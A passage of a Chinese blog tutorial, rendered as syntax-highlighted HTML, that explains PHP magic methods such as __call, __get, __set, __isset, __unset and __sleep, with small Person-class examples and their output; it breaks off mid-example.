说话方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫："</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"，性别："</span>.<span class="keyword">$this</span>-&gt;sex.<span class="string">"，年龄："</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明一个析构方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"我觉得我还可以再抢救一下，我的名字叫"</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>);</span><br><span class="line"><span class="keyword">unset</span>($Person); <span class="comment">//销毁上面创建的对象$Person</span></span><br></pre></td></tr></table></figure><p>上面的程序运行时输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我觉得我还可以再抢救一下，我的名字叫小明</span><br></pre></td></tr></table></figure><h3 id="call-，在对象中调用一个不可访问方法时调用。"><a href="#call-，在对象中调用一个不可访问方法时调用。" class="headerlink" title="__call()，在对象中调用一个不可访问方法时调用。"></a>__call()，在对象中调用一个不可访问方法时调用。</h3><p>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</p><p>1、 __call() 方法的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __call(string $function_name, array $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    // 方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 __call() 方法的作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</span><br><span class="line"></span><br><span class="line">该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</span><br></pre></td></tr></table></figure><p>请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;                             </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">                              </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>; </span><br><span class="line">    &#125;      </span><br><span class="line">        </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"你所调用的函数："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">          print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行                      </span></span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();            </span><br><span class="line">$Person-&gt;run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person-&gt;eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);             </span><br><span class="line">$Person-&gt;say();</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！</span><br><span class="line"></span><br><span class="line">你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！</span><br><span class="line"></span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h3 id="callStatic-，用静态方式中调用一个不可访问方法时调用"><a href="#callStatic-，用静态方式中调用一个不可访问方法时调用" class="headerlink" title="__callStatic()，用静态方式中调用一个不可访问方法时调用"></a>__callStatic()，用静态方式中调用一个不可访问方法时调用</h3><p>此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。</p><p>请看下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你所调用的静态方法："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">        print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();</span><br><span class="line">$Person::run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person::eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);</span><br><span class="line">$Person-&gt;say();</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！</span><br><span class="line">你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h3 id="get-，获得一个类的成员变量时调用"><a href="#get-，获得一个类的成员变量时调用" class="headerlink" title="__get()，获得一个类的成员变量时调用"></a>__get()，获得一个类的成员变量时调用</h3><p>在 php 面向对象编程中，类的成员属性被设定为 <code>private</code> 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 <code>__get()</code>。</p><ul><li><p>魔术方法__get()的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</span><br></pre></td></tr></table></figure><p>我们通过下面的 __get() 的实例来更进一步的连接它吧：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $age=<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $propertyName</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($propertyName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> ($propertyName == <span class="string">"age"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;age &gt; <span class="number">30</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age - <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">60</span>);   <span class="comment">// 通过Person类实例化的对象，并通过构造方法为属性赋初值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"姓名："</span> . $Person-&gt;name . <span class="string">"&lt;br&gt;"</span>;   <span class="comment">// 直接访问私有属性name，自动调用了__get()方法可以间接获取</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"年龄："</span> . $Person-&gt;age . <span class="string">"&lt;br&gt;"</span>;    <span class="comment">// 自动调用了__get()方法，根据对象本身的情况会返回不同的值</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">姓名：小明</span><br><span class="line">年龄：50</span><br></pre></td></tr></table></figure><h3 id="set-，设置一个类的成员变量时调用"><a href="#set-，设置一个类的成员变量时调用" class="headerlink" title="__set()，设置一个类的成员变量时调用"></a>__set()，设置一个类的成员变量时调用</h3><ul><li>__set() 的作用：</li></ul><p>__set( property,<em>p<strong>r</strong>o<strong>p</strong>e<strong>r</strong>t**y</em>,value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。</p><p>请看下面的演示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $property</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($property, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($property==<span class="string">"age"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">150</span> || $value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中声明说话的方法，将所有的私有属性说出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"，今年"</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">"岁了"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Person=<span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">//注意，初始值将被下面所改变</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</span></span><br><span class="line">$Person-&gt;name = <span class="string">"小红"</span>;     <span class="comment">//赋值成功。如果没有__set()，则出错。</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数</span></span><br><span class="line">$Person-&gt;age = <span class="number">16</span>; <span class="comment">//赋值成功</span></span><br><span class="line">$Person-&gt;age = <span class="number">160</span>; <span class="comment">//160是一个非法值，赋值失效</span></span><br><span class="line">$Person-&gt;say();  <span class="comment">//输出：我叫小红，今年16岁了</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我叫小红，今年16岁了</span><br></pre></td></tr></table></figure><h3 id="isset-，当对不可访问属性调用isset-或empty-时调用"><a href="#isset-，当对不可访问属性调用isset-或empty-时调用" class="headerlink" title="__isset()，当对不可访问属性调用isset()或empty()时调用"></a>__isset()，当对不可访问属性调用isset()或empty()时调用</h3><p>在看这个方法之前我们看一下<code>isset()</code>函数的应用，<code>isset()</code>是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。</p><p>那么如果在一个对象外面使用<code>isset()</code>这个函数去测定对象里面的成员是否被设定可不可以用它呢？</p><p>分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用<code>isset()</code>函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个<code>__isset()</code>方法就可以了，当在类外部使用<code>isset()</code>函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的<code>__isset()</code>方法了帮我们完成这样的操作。</p><ul><li><strong>isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，</strong>isset() 会被调用。</li></ul><p>请看下面代码演示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用isset()函数测定私有成员&#123;$content&#125;时，自动调用&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;sex),<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;name),<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;age),<span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 // public 可以 isset()</span><br><span class="line">当在类外部使用isset()函数测定私有成员name时，自动调用 // __isset() 内 第一个echo</span><br><span class="line">1 // __isset() 内第二个echo</span><br><span class="line">当在类外部使用isset()函数测定私有成员age时，自动调用 // __isset() 内 第一个echo</span><br><span class="line">1 // __isset() 内第二个echo</span><br></pre></td></tr></table></figure><h3 id="unset-，当对不可访问属性调用unset-时被调用。"><a href="#unset-，当对不可访问属性调用unset-时被调用。" class="headerlink" title="__unset()，当对不可访问属性调用unset()时被调用。"></a>__unset()，当对不可访问属性调用unset()时被调用。</h3><p>看这个方法之前呢，我们也先来看一下 <code>unset()</code> 函数，<code>unset()</code>这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。</p><p>那么如果在一个对象外部去删除对象内部的成员属性用<code>unset()</code>函数可以吗？</p><p>这里自然也是分两种情况：</p><p>1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。</p><p>2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。</p><p>虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上<code>__unset()</code>这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了<code>__unset()</code>这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用<code>__unset()</code>函数来帮我们删除对象内部的私有成员属性。</p><p>请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">unset</span>($person-&gt;sex);</span><br><span class="line"><span class="keyword">unset</span>($person-&gt;name);</span><br><span class="line"><span class="keyword">unset</span>($person-&gt;age);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用unset()函数来删除私有成员时自动调用的</span><br><span class="line">1当在类外部使用unset()函数来删除私有成员时自动调用的</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="sleep-，执行serialize-时，先会调用这个函数"><a href="#sleep-，执行serialize-时，先会调用这个函数" class="headerlink" title="__sleep()，执行serialize()时，先会调用这个函数"></a>__sleep()，执行serialize()时，先会调用这个函数</h3><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span><br></pre></td></tr></table></figure><p>具体请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span 